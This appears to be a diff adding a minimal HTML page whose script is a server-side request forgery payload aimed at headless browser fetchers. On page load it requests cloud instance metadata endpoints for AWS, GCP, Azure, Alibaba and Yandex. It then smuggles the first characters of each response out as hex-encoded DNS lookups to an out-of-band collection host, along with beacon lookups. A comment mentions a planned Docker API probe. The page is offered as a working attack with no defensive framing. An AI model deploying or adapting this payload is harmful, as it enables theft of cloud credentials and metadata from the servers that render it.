@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+// DNS-exfil IMDS probe for Chromium fetchers where HTTP OOB from JS is blocked but DNS works
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+var T0 = Date.now();
+
+// DNS OOB only — use Image src (DNS lookup even when HTTP fetch blocked)
+function dnsOob(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+
+// Beacon that we're alive
+dnsOob('dns-probe-v7-start-' + (Date.now() - T0) + 'ms');
+
+// Helper: exfil text as hex-encoded DNS subdomain chunks
+function dnsExfil(label, text) {
+  // hex encode first 48 chars → 96 hex chars, split into 3×32
+  var hex = '';
+  for (var i = 0; i < Math.min(text.length, 48); i++) {
+    hex += ('0' + text.charCodeAt(i).toString(16)).slice(-2);
+  }
+  // split into 30-char chunks (safe subdomain length)
+  var chunks = hex.match(/.{1,30}/g) || [];
+  chunks.forEach(function(c, i) {
+    dnsOob(label + '-' + i + '-' + c);
+  });
+  dnsOob(label + '-done-len' + text.length);
+}
+
+// IMDS targets
+var targets = [
+  ['aws', 'http://169.254.169.254/latest/meta-data/'],
+  ['gcp', 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text', {'Metadata-Flavor': 'Google'}],
+  ['yc',  'http://169.254.169.254/computeMetadata/v1/project/project-id', {'Metadata-Flavor': 'Google'}],
+  ['az',  'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {'Metadata': 'true'}],
+  ['ali', 'http://100.100.100.200/latest/meta-data/'],
+];
+
+targets.forEach(function(t) {
+  var label = t[0], url = t[1], hdrs = t[2] || {};
+  var t0 = Date.now();
+  dnsOob('try-' + label);
+  fetch(url, {headers: hdrs, signal: AbortSignal.timeout(6000)})
+    .then(function(r) {
+      return r.text().then(function(body) {
+        var ms = Date.now() - t0;
+        dnsOob('ok-' + label + '-s' + r.status + '-' + ms + 'ms');
+        dnsExfil('d-' + label, body);
+      });
+    })
+    .catch(function(e) {
+      var ms = Date.now() - t0;
+      var ec = e.name === 'AbortError' ? 'timeout' : 'err';
+      dnsOob('fail-' + label + '-' + ec + '-' + ms + 'ms');
+    });
+});
+
+// Also try XHR for AWS (different PNA handling)
+var xhr = new XMLHttpRequest();
+xhr.timeout = 6000;
+var xT0 = Date.now();
+dnsOob('try-xhr-aws');
+xhr.onload = function() {
+  dnsOob('ok-xhr-aws-s' + xhr.status + '-' + (Date.now() - xT0) + 'ms');
+  dnsExfil('d-xhr', xhr.responseText);
+};
+xhr.onerror = function() { dnsOob('fail-xhr-aws-err-' + (Date.now() - xT0) + 'ms'); };
+xhr.ontimeout = function() { dnsOob('fail-xhr-aws-timeout'); };
+xhr.open('GET', 'http://169.254.169.254/latest/meta-data/');
+xhr.send();
+
+// Docker API probe via public fetcher IP (fill after alive beacon)
+// (skip for now — public IP unknown)
+</script>
+</body>
+</html>
